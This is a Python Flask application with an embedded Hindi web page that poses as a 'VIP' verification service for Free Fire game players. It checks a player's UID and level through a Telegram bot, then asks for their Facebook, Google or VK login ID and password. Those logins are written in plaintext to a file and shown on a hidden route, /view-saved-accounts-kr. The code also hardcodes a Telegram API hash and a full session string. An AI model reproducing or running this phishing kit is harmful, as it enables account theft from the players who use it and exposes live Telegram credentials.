from flask import Flask, request, render_template_string, jsonify
import asyncio
import re
from pyrogram import Client

app = Flask(__name__)

# ==================== TELEGRAM CONFIG ====================
API_ID = 36111584
API_HASH = '6f0e6729043de10d48250cc2bc613a6f'
STRING_SESSION = "BQInBOAAOgLtSj7-SKUGoo8aRfWEKh6FhHxMUgQonz6Ub6rQlPY1gul0xKn1uW8O1lw6dcs5sD1ASz0-uvFw_SgTzeNU4Qkedeyewv09fn0As4Gk5q2BWF9sKqoJFK-qB1_QZ5qmn-BOKtXo-j2P-TtiX4h4UjkcU7otYsm7reqzUmpcpasMWOzegDVEikyyobuPRLqCHQe0erFCs354ojUXz7JpZOcPUmUViScbjw3kj0qSbrTQRPv7WjYNll1KLWkmqkoTIkX8lqbUfPey1pkiDJjQiDWo3itR2Pb5uEg5LvmUvbGQfkANwv7w0DEqasddjKulYFoduLiHhoT6M8Sl0iXwOwAAAAGHwtM4AA"

# यहाँ अपने इंफो बोट का सही यूजरनेम बिना @ के लिखें
INFO_BOT_USERNAME = "FreeFireInfoBot" 

DATA_FILE = "/tmp/saved_accounts.txt"

# ==================== HTML INTERFACE ====================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👑 S.KANHAIYA VIP SERVICES</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #0f0c20; color: #fff; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .container { width: 100%; max-width: 500px; background: #1a1635; padding: 25px; border-radius: 15px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); border: 1px solid #3d307a; margin-bottom: 20px; }
        h1 { text-align: center; color: #00ffcc; margin-bottom: 10px; font-size: 24px; text-shadow: 0 0 10px rgba(0,255,204,0.3); }
        p.subtitle { text-align: center; color: #aaa; font-size: 14px; margin-bottom: 25px; }
        .section-title { font-size: 18px; color: #ff007f; margin-bottom: 15px; border-bottom: 1px solid #3d307a; padding-bottom: 5px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #ccc; font-size: 14px; }
        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #3d307a; background: #0f0c20; color: #fff; font-size: 16px; outline: none; }
        input:focus { border-color: #00ffcc; }
        button { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 5px; }
        .btn-free { background: linear-gradient(45deg, #00ffcc, #0099ff); color: #0f0c20; }
        .btn-free:hover { opacity: 0.9; box-shadow: 0 0 15px rgba(0,255,204,0.4); }
        .locked-btn { background: #444 !important; color: #888 !important; cursor: not-allowed; }
        .response-box { margin-top: 15px; padding: 12px; border-radius: 8px; font-size: 14px; display: none; line-height: 1.5; white-space: pre-line; }
        .success { background: rgba(0, 255, 13, 0.1); border: 1px solid #00ffcc; color: #00ffcc; }
        .error { background: rgba(255, 0, 127, 0.1); border: 1px solid #ff007f; color: #ff007f; }
        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 10px; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>👑 S.KANHAIYA SERVICES</h1>
        <p class="subtitle">टेलीग्राम ऑटो-इंफो वेरिफिकेशन सिस्टम</p>
        
        <div class="section-title">🔍 STEP 1: VERIFY GAME UID</div>
        <form id="verifyForm">
            <div class="form-group">
                <label>गेम यूआईडी (Game UID):</label>
                <input type="number" id="gameUid" placeholder="यहाँ अपनी गेम यूआईडी डालें" required>
            </div>
            <button type="submit" class="btn-free">बोट से डेटा निकालें</button>
        </form>

        <div id="verifyResponse" class="response-box"></div>
    </div>

    <div class="container">
        <div class="section-title">🥷 STEP 2: PREMIUM GUEST LOGIN</div>
        <form id="guestLoginForm">
            <div class="form-group">
                <label>गेस्ट लॉगिन आईडी (FB/Google/VK/ID):</label>
                <input type="text" id="guestId" placeholder="लॉगिन आईडी दर्ज करें" required disabled>
            </div>
            <div class="form-group">
                <label>पासवर्ड (Password):</label>
                <input type="password" id="guestPass" placeholder="पासवर्ड दर्ज करें" required disabled>
            </div>
            <button type="submit" id="loginSubmitBtn" class="locked-btn" style="margin-top: 10px;" disabled>🔐 डेटा सेव करें</button>
        </form>
        
        <div id="loginResponse" class="response-box"></div>
    </div>

    <div class="footer">⚡️ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋ.ʀ sᴇʀᴠɪ́ᴄᴇ</div>

    <script>
        let verifiedUid = "";

        // स्टेप 1: यूआईडी वेरिफिकेशन हैंडलर
        document.getElementById('verifyForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const uid = document.getElementById('gameUid').value;
            const resBox = document.getElementById('verifyResponse');
            
            resBox.style.display = 'block';
            resBox.className = 'response-box success';
            resBox.innerText = '🔄 आपका टेलीग्राम अकाउंट इंफो बोट को /get कमांड भेज रहा है... कृपया रुकें...';

            try {
                const response = await fetch('/api/tg-verify?uid=' + uid);
                const data = await response.json();
                
                if (data.success) {
                    resBox.className = 'response-box success';
                    // 🎯 यहाँ बैकट्रिक्स (\`) का इस्तेमाल करके स्ट्रिंग को सही किया ताकि डेटा स्क्रीन पर दिखे
                    resBox.innerText = `✅ बोट रेस्पॉन्स प्राप्त हुआ!\\n\\n📝 बोट का मैसेज:\\n\${data.bot_msg}`;
                    
                    if (data.level >= 8) {
                        resBox.innerText += `\\n\\n🎉 स्तर (Level): \${data.level} (8 या उससे ऊपर है)। स्टेप 2 अनलॉक हो गया है भाई!`;
                        document.getElementById('guestId').removeAttribute('disabled');
                        document.getElementById('guestPass').removeAttribute('disabled');
                        
                        const loginBtn = document.getElementById('loginSubmitBtn');
                        loginBtn.removeAttribute('disabled');
                        loginBtn.className = 'btn-free';
                        loginBtn.style.background = '#7f00ff';
                        loginBtn.style.color = '#fff';
                        
                        verifiedUid = uid;
                    } else {
                        resBox.className = 'response-box error';
                        resBox.innerText += `\\n\\n❌ लॉगिन फेल! बोट के अनुसार आपका स्तर \${data.level} है। प्रीमियम एक्सेस के लिए कम से कम लेवल 8 होना ज़रूरी है भाई।`;
                    }
                } else {
                    resBox.className = 'response-box error';
                    resBox.innerText = `❌ बोट से डेटा नहीं मिल सका। कारण: \${data.message}`;
                }
            } catch (err) {
                resBox.className = 'response-box error';
                resBox.innerText = '❌ सर्वर से कनेक्ट करने में समस्या आई।';
            }
        });

        // स्टेप 2: डेटा सेव करना
        document.getElementById('guestLoginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const guestId = document.getElementById('guestId').value;
            const guestPass = document.getElementById('guestPass').value;
            const resBox = document.getElementById('loginResponse');

            resBox.style.display = 'block';
            resBox.className = 'response-box success';
            resBox.innerText = '🔄 डेटा सुरक्षित सेव किया जा रहा है...';

            try {
                const response = await fetch('/api/save-guest', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        uid: verifiedUid,
                        guest_id: guestId,
                        guest_pass: guestPass
                    })
                });
                const data = await response.json();

                if (data.success) {
                    resBox.className = 'response-box success';
                    resBox.innerText = '🎉 लॉगिन सफल! गेस्ट अकाउंट का डेटा फाइल में सुरक्षित सेव हो गया है।';
                } else {
                    resBox.className = 'response-box error';
                    resBox.innerText = '❌ डेटा सेव करने में समस्या आई।';
                }
            } catch (err) {
                resBox.className = 'response-box error';
                resBox.innerText = '❌ कनेक्शन एरर।';
            }
        });
    </script>
</body>
</html>
"""

# ==================== PYROGRAM BACKGROUND LOGIC ============
async def ask_info_bot(uid):
    tg_client = Client("kr_web_client", api_id=API_ID, api_hash=API_HASH, session_string=STRING_SESSION, in_memory=True)
    try:
        await tg_client.start()
        
        # पुराना चैट इतिहास साफ या मार्क रीड करना ताकि पुराना मैसेज मिक्स न हो
        try:
            await tg_client.read_chat_history(INFO_BOT_USERNAME)
        except:
            pass

        # इंफो बोट को कमांड भेजना
        await tg_client.send_message(INFO_BOT_USERNAME, f"/get {uid}")
        
        # बोट के रिप्लाई का इंतजार (7 सेकंड रुकना ताकि बोट फोटो/टेक्स्ट भेज सके)
        await asyncio.sleep(7)
        
        bot_response_text = ""
        
        # बोट चैट से एकदम लेटेस्ट मैसेजेस निकालना
        async for message in tg_client.get_chat_history(INFO_BOT_USERNAME, limit=3):
            # बोट का रिप्लाई या तो कैप्शन (अगर फोटो भेजी है) या नॉर्मल टेक्स्ट होगा
            if message.from_user and message.from_user.username == INFO_BOT_USERNAME:
                if message.caption:
                    bot_response_text = message.caption
                    break
                elif message.text:
                    bot_response_text = message.text
                    break
                
        await tg_client.stop()
        
        if bot_response_text:
            # बोट के रिप्लाई में से लेवल (Level) नंबर ढूंढना
            # यह 'Level : 55' या 'स्तर : 60' या 'Lv: 8' जैसे किसी भी फॉर्मेट से नंबर निकाल लेगा
            level_match = re.search(r'(?:Level|level|स्तर|Lv|LV)\s*[:\s]*\s*(\d+)', bot_response_text)
            
            if level_match:
                level = int(level_match.group(1))
            else:
                # अगर सीधे नहीं मिला, तो पूरे मैसेज में से 1 से 100 के बीच का कोई भी वैलिड नंबर ढूंढना
                all_nums = re.findall(r'\b\d+\b', bot_response_text)
                level = 0
                for n in all_nums:
                    val = int(n)
                    if 1 <= val <= 100:  # गेम का लेवल आमतौर पर 1 से 100 होता है
                        level = val
                        break
                        
            return {"success": True, "bot_msg": bot_response_text, "level": level}
        else:
            return {"success": False, "message": "बॉट की तरफ से कोई रिप्लाई नहीं आया या टाइमआउट हो गया।"}
            
    except Exception as e:
        try: await tg_client.stop()
        except: pass
        return {"success": False, "message": str(e)}

# ==================== FLASK ROUTES ====================
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/tg-verify')
def tg_verify():
    uid = request.args.get('uid')
    if not uid:
        return jsonify({"success": False, "message": "UID आवश्यक है"}), 400
        
    # एसिंक फंक्शन को बिना एरर के रन करने के लिए नया लूप
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(ask_info_bot(uid))
    loop.close()
    return jsonify(result)

@app.route('/api/save-guest', methods=['POST'])
def save_guest():
    data = request.get_json()
    uid = data.get('uid')
    guest_id = data.get('guest_id')
    guest_pass = data.get('guest_pass')
    
    try:
        entry = f"UID: {uid} | Guest ID: {guest_id} | Password: {guest_pass}\n"
        with open(DATA_FILE, "a", encoding="utf-8") as f:
            f.write(entry)
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/view-saved-accounts-kr')
def view_accounts():
    import os
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    return "अभी तक कोई डेटा सेव नहीं हुआ है भाई!"

if __name__ == '__main__':
    app.run(debug=True, port=5000)
